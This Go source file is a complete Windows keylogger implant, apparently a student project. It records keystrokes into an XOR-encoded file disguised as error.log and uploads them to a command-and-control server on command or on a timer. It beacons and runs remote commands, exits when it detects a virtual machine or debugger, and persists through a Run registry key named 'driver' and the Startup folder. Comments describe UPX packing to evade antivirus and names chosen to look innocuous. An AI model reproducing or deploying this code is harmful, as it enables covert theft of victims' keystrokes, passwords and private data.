/*
packed using https://github.com/upx/upx/releases/tag/v4.2.4 to avoid coming up
on any antiviruses
*/
package main

import (
	"bytes"
	crand "crypto/rand"
	"crypto/tls"
	"crypto/x509"
	_ "embed"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	mrand "math/rand"
	"mime/multipart"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/gen2brain/beeep"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry" 

	"github.com/watsittoye/go-keylogger" 
)

/*
defines serverurl and encoding key (this would be overwritten)
generates a unique client id
*/
var serverURL = "https://localhost:8443"
var uniqueID = generateUniqueID()
var encyptionKey byte = 0xA1

/*
generates a client id by combining a string of random bytes and the hostname

this is using a pseudo random function which is based on seeds which are dependant
the time its created at to an extent
*/
func generateUniqueID() string {
	host, _ := os.Hostname()
	randomBytes := make([]byte, 4)
	crand.Read(randomBytes)
	return host + "-" + hex.EncodeToString(randomBytes)
}

/*
generates a key for the XOR encoding. It makes it so that the key is not stored in the code and
generated dynamically so it wouldnt be easily found when doing malware analysis. wouldnt be easily
readible in the strings.
*/
func generateKey() string {
	randByte := byte(mrand.Intn(256))
	key := fmt.Sprintf("%02X", randByte)
	return key
}

/*
encords the files coming in using XOR refered to  https://www.youtube.com/watch?v=AMjC6kgoBD8&t=3s
this is a very easily reversible function
*/
func encord(plainText string) []byte {
	cipherText := make([]byte, len(plainText))

	for i := 0; i < len(plainText); i++ {
		c := plainText[i]
		cipherText[i] = c ^ encyptionKey
	}

	return cipherText
}

/*
registers itself with the C&C server. returns relevant errors where needed.
also sends the encoding key to the server.

made the key parameter c cos its less suspicious than k imo
*/
func registerWithCC(client *http.Client, clientID string) error {
	parsedInt, _ := strconv.ParseUint(generateKey(), 16, 8)
	byteVal := byte(parsedInt)
	encyptionKey = byteVal

	resp, err := client.Get(fmt.Sprintf("%s/api/v1/register?d=%s&c=%x", serverURL, clientID, byteVal))
	if err != nil {
		log.Fatalf("Failed to register with C&C server: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		log.Fatalf("Failed to register with C&C server. Status code: %d", resp.StatusCode)
	}

	fmt.Println("Registered successfully with C&C server")
	return nil
}

/*
unregisters itself from the server
*/
func unregisterFromCC(clientID string) {
	url := fmt.Sprintf("%s/api/v1/shop/delete-item?d=%s", serverURL, clientID)
	resp, err := http.Get(url)
	if err != nil {
		log.Fatalf("Failed to unregister from the server: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		log.Fatalf("Failed to unregister from the server. Status code: %d", resp.StatusCode)
	}

	fmt.Println("Unregistered successfully from the server")
}

/*
periodically sends beacons, toggles pause state when a pause command is sent.
calls sendBeacon to send the beacon

this allows the server to know if the client is still active
*/
func beacon(client *http.Client, clientID string, pauseCh <-chan struct{}) {
	beaconPeriod := time.Duration(mrand.Intn(60)) * time.Second
	ticker := time.NewTicker(beaconPeriod)
	defer ticker.Stop()
	paused := false
	for {
		select {
		case <-pauseCh:
			paused = !paused
		case <-ticker.C:
			if !paused {
				sendBeacon(client, clientID)
			}
		}
	}
}

/*
sends  beacon to the C&C server
*/
func sendBeacon(client *http.Client, clientID string) {
	url := fmt.Sprintf("%s/api/v1/status?d=%s&t=%s", serverURL, clientID, time.Now().Format(time.RFC3339))
	resp, err := client.Get(url)
	if err != nil {
		log.Printf("Failed to send beacon: %v", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		log.Printf("Failed to send beacon. Status code: %d", resp.StatusCode)
		return
	}
	fmt.Println("Beacon sent successfully")
}

/*
gets commands for this specific client
*/
func handleCommands(client *http.Client) {
	for {
		url := fmt.Sprintf("%s//api/v2/update?d=%s", serverURL, uniqueID)
		resp, err := client.Get(url)
		if err != nil {
			fmt.Println("Failed to get commands:", err)
			time.Sleep(5 * time.Second)
			continue
		}
		defer resp.Body.Close()

		body, err := io.ReadAll(resp.Body)
		if err != nil {
			fmt.Println("Failed to read command response:", err)
			time.Sleep(5 * time.Second)
			continue
		}

		command := string(body)
		if command == "" {
			time.Sleep(5 * time.Second)
			continue
		}

		fmt.Println("Received command:", command)
		executeCommand(client, command)
	}
}

/*
makes channels that can communicate to structs to either pause or quit funcs
its ususally used to sync functions
*/
var pauseCh = make(chan struct{})
var quitCh = make(chan struct{})

/*
execute commands sent to the client
*/
func executeCommand(client *http.Client, command string) {
	switch {
	case command == "pwn":
		beeep.Alert("Server Alert", "You've been pwned so I can get good grades", "")
		fmt.Println("You've been pwned so I can get good grades")
	case command[:3] == "slp":
		var duration int
		fmt.Sscanf(command, "slp %d", &duration)
		fmt.Printf("Sleeping for %d seconds\n", duration)
		pauseCh <- struct{}{}
		pauseCh <- struct{}{}
		time.Sleep(time.Duration(duration) * time.Second)
		pauseCh <- struct{}{}
		pauseCh <- struct{}{}
	case command == "shd":
		fmt.Println("Shutting down...")
		os.Remove("error.log")
		//unregisterFromCC(uniqueID)
		os.Exit(0)

	case command == "upload":
		fmt.Println("Uploading keylog file...")
		quitCh <- struct{}{}
		uploadKeylog(client)
		go keylog(pauseCh)
	}
}

/*
logs keystrokes. I forked an already made keylogger and altered it to fit my needs

called it error.log because its less suspicious than keylog.log. Also error.log is pretty common
as far as .log files go
*/
func keylog(pauseCh <-chan struct{}) {
	fileName := fmt.Sprintf("error.log")
	file, err := os.OpenFile(fileName, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatalf("Failed to open log file: %v", err)
	}
	defer file.Close()

	keylog := keylogger.NewKeylogger()
	paused := false
	for {
		select {
		case <-pauseCh:
			paused = !paused
		case <-quitCh:
			fmt.Println("Quitting keylogger...")
			file.Close()
			return
		default:
			if !paused {
				key := keylog.GetKey()
				if !key.Empty {
					var logEntry string

					if key.Name != "" {
						logEntry = fmt.Sprintf("'%s' %d\n", key.Name, key.Keycode)

					} else {
						logEntry = fmt.Sprintf("'%c' %d \n", key.Rune, key.Keycode)
					}

					fmt.Print(logEntry)

					//logEntry = fmt.Sprintf("'%c' %d\n", key.Rune, key.Keycode)
					encordedLogEntry := encord(logEntry)
					if _, err := file.Write(encordedLogEntry); err != nil {
						log.Printf("Failed to write to log file: %v", err)
					}
				}
			}
			time.Sleep(5 * time.Millisecond)
		}
	}
}

/*
uplods the keylog files and deletes the file thats already there. It quits the func to stop
the error where the file is already being used
refered to  https://stackoverflow.com/questions/44173461/copy-a-file-from-client-to-server-via-rest-end-point-using-golang
for help

it encords the key strokes so the target wouldnt be able to tell what the program does if they find the file
*/
func uploadKeylog(client *http.Client) {
	fileName := fmt.Sprintf("error.log")
	file, err := os.Open(fileName)
	if err != nil {
		fmt.Errorf("Failed to open log file: %v", err)
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	part, err := writer.CreateFormFile("file", fileName)
	if err != nil {
		fmt.Errorf("Failed to create form file: %v", err)
	}

	_, err = io.Copy(part, file)
	if err != nil {
		fmt.Errorf("Failed to copy file to form: %v", err)
	}

	_ = writer.WriteField("id", uniqueID)

	err = writer.Close()
	if err != nil {
		fmt.Errorf("Failed to close form writer: %v", err)
	}

	url := fmt.Sprintf("%s/store/update", serverURL)
	req, err := http.NewRequest("POST", url, body)
	if err != nil {
		fmt.Errorf("Failed to create request: %v", err)
	}

	req.Header.Set("Content-Type", writer.FormDataContentType())

	resp, err := client.Do(req)
	if err != nil {
		fmt.Errorf("Failed to perform request: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		fmt.Errorf("Server returned non-OK status: %v", resp.Status)
	}
	file.Close()
	err = os.Remove(fileName)
	if err != nil {
		log.Printf("Failed to delete local log file: %v", err)
	}
}

func uploadPeriodically(client *http.Client, pauseCh <-chan struct{}) {
	uploadPeriod := time.Duration(mrand.Intn(60)) * time.Second
	ticker := time.NewTicker(uploadPeriod)
	defer ticker.Stop()

	paused := false
	for {
		select {
		case <-pauseCh:
			paused = !paused
		case <-ticker.C:
			if !paused {
				executeCommand(client, "upload")
			}
		}
	}
}

/*
Inspiration: https://github.com/ShellCode33/VM-Detection/blob/v0.1.0/vmdetect/windows.go
didnt want to import because i wanted to try it out

check for files, registry keys,directories and mac addresses associated with VMS
and quit if they exist.
*/

func isVM() bool {
	vmFiles := []string{
		"/.dockerenv",    // Docker
		"/dev/vboxguest", // VirtualBox
		"/dev/vmci",      // VMware
	}

	for _, file := range vmFiles {
		if _, err := os.Stat(file); err == nil {
			return true
		}
	}

	deviceFiles := []string{
		"/sys/class/dmi/id/product_name",
		"/sys/class/dmi/id/sys_vendor",
	}

	for _, device := range deviceFiles {
		data, err := os.ReadFile(device)
		if err == nil && strings.Contains(string(data), "Virtual") {
			return true
		}
	}

	processes := []string{
		"vboxservice", // VirtualBox
		"vmtoolsd",    // VMware Tools
		"vmsrvc",      // VMware Service
	}

	out, err := exec.Command("tasklist").Output()
	if err != nil {
		fmt.Println("Error checking processes:", err)
		return false
	}

	processList := string(out)
	for _, process := range processes {
		if strings.Contains(processList, process) {
			return true
		}
	}

	// Check for registry keys
	keys := []string{
		`HARDWARE\ACPI\DSDT\VBOX__`,          //VirtualBox
		`SOFTWARE\VMware, Inc.\VMware Tools`, // VMware
	}

	for _, key := range keys {
		k, err := registry.OpenKey(registry.LOCAL_MACHINE, key, registry.QUERY_VALUE)
		if err == nil {
			k.Close()
			return true
		}
	}

	// Check for MAC addresses
	vmMACs := []string{
		"00:05:69", // VMware
		"00:0C:29", // VMware
		"00:1C:14", // VMware
		"00:50:56", // VMware
		"08:00:27", // VirtualBox
		"52:54:00", // QEMU
	}

	interfaces, err := net.Interfaces()
	if err != nil {
		fmt.Println("Error checking network interfaces:", err)
		return false
	}

	for _, iface := range interfaces {
		mac := iface.HardwareAddr.String()
		for _, vmMAC := range vmMACs {
			if len(mac) >= len(vmMAC) && mac[:len(vmMAC)] == vmMAC {
				return true
			}
		}
	}

	return false
}

/*
https://learn.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-isdebuggerpresent
checks if a debugger exists in the isDEbuggerPresent functionf from kernel32.dll to see if theres a debugger
present
*/
func checkDebugger() bool {
	debuggerExists := windows.NewLazySystemDLL("kernel32.dll").NewProc("IsDebuggerPresent")
	debugger, _, _ := debuggerExists.Call()
	if debugger != 0 {
		log.Println("Debugger detected. Exiting...")
		os.Exit(1)
	}
	return debugger != 0
}

const ProcessDebugFlags = 31

func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destinationFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destinationFile.Close()

	_, err = io.Copy(destinationFile, sourceFile)
	if err != nil {
		return err
	}

	err = destinationFile.Sync()
	if err != nil {
		return err
	}

	return nil
}

/*
adding the a to registry as "driver"
allows the app to start on startup. Its called driver so it looks important
*/
func addToRegistry(exePath string) error {

	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE)
	if err != nil {
		return err
	}
	defer k.Close()

	if err = k.SetStringValue("driver", exePath); err != nil {
		return err
	}
	fmt.Println(k)

	return nil
}

/*
adding the exe to startup
makes it so windows starts the exe starts on startup
*/
func addToStartup(exePath string) error {
	startupPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup", "client.exe")

	err := copyFile(exePath, startupPath)
	if err != nil {
		return fmt.Errorf("failed to copy file to startup folder: %w", err)
	}

	return nil
}

/*
embeding keys so its not easy to just get from resources
*/

//go:embed ca.crt
var caCert []byte

//go:embed client.crt
var clientCert []byte

//go:embed client.key
var clientKey []byte

/*
Main function, sets up clients, certs and cert pools for tls
I'm insecurely skipping verification cos it has a problem with
self signed certs.
Also sends the client to the relevent funcs
refered to https://www.youtube.com/watch?v=VF7lof3bSfE for insperation
*/
func main() {
	if isVM() {
	 	fmt.Println("Detected virtualization environment. Exiting...")
	 	os.Exit(1)
	 }
	if checkDebugger() {
		log.Println("Debugger detected. Exiting...")
		os.Exit(1)
	}

	exePath, err := os.Executable()
	if err != nil {
		log.Fatalf("Failed to get executable path: %v", err)
	}

	fmt.Println(exePath)

	err = addToRegistry(exePath)
	if err != nil {
		log.Println("Failed to add registry persistence: %v", err)
	}

	err = addToStartup(exePath)
	if err != nil {
		log.Println("Failed to add to startup: %v", err)
	}

	caCertPool := x509.NewCertPool()
	if !caCertPool.AppendCertsFromPEM(caCert) {
		log.Fatalf("Failed to append CA certificate to pool")
	}

	cert, err := tls.X509KeyPair(clientCert, clientKey)
	if err != nil {
		log.Fatalf("Failed to load client certificate: %v", err)
	}
	log.Println("Client certificate loaded successfully")

	tlsConfig := &tls.Config{
		RootCAs:            caCertPool,
		Certificates:       []tls.Certificate{cert},
		MinVersion:         tls.VersionTLS12,
		MaxVersion:         tls.VersionTLS12,
		InsecureSkipVerify: true,
	}

	tr := &http.Transport{
		TLSClientConfig: tlsConfig,
	}

	client := &http.Client{Transport: tr}

	registerWithCC(client, uniqueID)

	go beacon(client, uniqueID, pauseCh)
	go handleCommands(client)
	go keylog(pauseCh)
	go uploadPeriodically(client, pauseCh)
	select {}
}
